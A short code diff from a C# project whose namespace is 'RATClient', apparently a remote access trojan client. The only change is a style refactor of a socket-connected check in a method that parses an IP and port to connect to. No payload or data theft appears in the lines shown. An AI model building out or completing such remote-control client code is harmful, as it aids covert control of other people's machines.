@@ -71,7 +71,7 @@ namespace RATClient
         }
         static void Connect(string Dest)
         {
-            if (sock.Connected == false) {
+            if (!sock.Connected) {
                 string[] IPInfo = Dest.Split(':');
                 IPAddress ip = IPAddress.Parse(IPInfo[0]);
                 int port = 0;
